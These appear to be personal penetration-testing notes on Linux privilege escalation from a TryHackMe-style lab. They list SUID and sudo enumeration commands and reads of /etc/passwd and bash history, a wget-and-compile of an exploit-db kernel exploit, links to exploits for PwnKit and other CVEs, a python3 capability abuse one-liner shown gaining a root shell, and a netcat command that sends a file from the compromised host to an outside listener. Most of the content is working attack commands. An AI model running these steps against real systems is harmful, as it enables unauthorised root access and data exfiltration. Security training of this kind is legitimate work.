
INPUT: Stablished shell
PROCESS:
- Privilege Escalation
    - Manual Vector Finding
        - find / -perm /4000 2>/dev/null
        - find / -type f -user root -perm -u=s 2>/dev/null
        - find / -perm -u=s -type f 2>/dev/null
        - sudo -l
        - sudo -V
        - cat .bash_history
        - cat /etc/passwd    
    - Using kit
        - [linpeas.sh] Auto Vector Finding
- Maintain Access    
TOOLS
- Exploit
- GTFOBins
- Python Library Hijacking
- Environment variables
OUPUT:
- root shell


## Exploit
[cve-2017-16995]
    wget https://www.exploit-db.com/download/45010 -O cve-2017-16995.c
    gcc --static cve-2017-16995.c -o cve-2017-16995
[CVE-2021-4034]
    https://www.exploit-db.com/exploits/50689
    https://github.com/ryaagard/CVE-2021-4034
    https://github.com/c3c/CVE-2021-4034
[CVE-2017-0143]
    https://www.exploit-db.com/exploits/43970
[CVE-2014-4014]
    https://www.exploit-db.com/exploits/33824
[GTFOBins]
    https://gtfobins.github.io/
[$PATH]
    Linux Privilege Escalation Using PATH Variable
[tmux]
    tmux -S default attach
[Capability]
    getcap -r / 2>/dev/null
        /home/kiba/.hackmeplease/python3 = cap_setuid+ep
        /usr/bin/mtr = cap_net_raw+ep
        /usr/bin/traceroute6.iputils = cap_net_raw+ep
        /usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
    cd /home/kiba/.hackmeplease    
    ./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
    id
        uid=0(root) gid=1000(kiba) groups=1000(kiba),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)

## Transferring file using Netcat:
- on the remote host 
    nc 10.8.56.2 443 < tryhackme.asc
- on the local host
    sudo nc -lvnp 443 > tryhackme.asc




